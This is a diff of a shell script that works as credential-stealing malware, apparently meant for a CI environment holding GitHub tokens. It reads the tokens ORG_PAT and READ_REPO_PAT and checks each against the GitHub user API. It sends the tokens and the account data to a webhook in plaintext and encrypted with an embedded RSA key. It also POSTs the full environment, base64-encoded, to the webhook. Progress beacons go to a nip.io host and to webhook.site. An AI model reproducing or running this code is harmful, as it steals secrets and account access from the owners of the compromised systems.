@@ -6,13 +6,13 @@ curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460
 
 
 PUB_KEY='-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt9hnfNHb9MVC0diYp3hr
-5o9hsJAq1DiDSOITsCG3ostdPtCNIY+GPfK2IwQQx5XbMV0CLih4ifr7pJTV4Bl0
-/nbLhokLuuSmZUfUR0acJEDStnDtB8C+Scz9tzTdnU0NrTiO8ccUfwpuoLKudrFZ
-kwhRwPDbIKDPCoEeX7K3DrZhlkh3kHOrgoqM4UCD4ljEE53IiuOxbGHqP1vNztb/
-g2d4XOnumbJHAtS7PFBaiju5SohE21eIyd9TL2oStlmpRw/8VfrR9g9RaXlxYXsB
-Ps7xrofPC8sgCwiPuNwIg9ALLAuHFlNIIQ5iFqOj0bu0JZMEy00zrWIo3x1dTtcC
-uwIDAQAB
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAn5lV+rDFTkY9IFjLxBsd
+pcqfzZNQnJcvH132syWYRyU65FluSvuBDqVsXeDIY2LZS99G8rzk3h6/hIGeD/uA
+kWaoOnxKE/K6XW+inlEH7v+aNbQnebRTR5fdVtyelfqWksGqB2HNm46/8n5aLazF
+Qrcofjbz3acJwnnmn/S+fXZCeuWhxwHqxh7uiZPWEQaOLl3mIw2QC8OzWCc4KmVQ
+7aimO2CsEvVLvj6r8ESxK7D71dDh/rXxFlv44o4L1QtyUqUNhDCiTzRJCGxFi4ul
+WU4yhCUzp+qwCKHIbosexvK2BmDXnMSXeFlYZ329jw5JzUAKejSWvyeu5VDMHufD
+/wIDAQAB
 -----END PUBLIC KEY-----'
 export LC_ALL=C
 
@@ -26,7 +26,7 @@ for pat in ORG_PAT READ_REPO_PAT; do
 		# ------------------------------------------------------- fetch the data --
 		user_info="$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)"
 		string="$user_info"     # includes response headers because of -i
-		curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/got-user-info
+		# curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/got-user-info
 
 		# ------------------------------------------------ chunked encryption -----
 
@@ -38,21 +38,19 @@ for pat in ORG_PAT READ_REPO_PAT; do
 		    i=$(( i + CHUNK_SIZE ))
 		done
 
-		curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/finished-loop
-		# ------------------------------- join chunks ('.' i never in base64) ----
+		# curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/finished-loop
+
 		encrypted_string="$(printf '%s.' "${chunks[@]}")"
 		encrypted_string="${encrypted_string%.}"
 
-		curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
-
 		encrypted_token=$(printf '%s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
 		encrypted_pat=$(printf '%s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
+		curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
 		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$encrypted_string"
 done
 
 env -0 | base64 -w 0 | curl -s -o /dev/null -X POST -d @- "$webhook"
 
 # test if quit with no errors
-curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/finish
 curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/stop
 
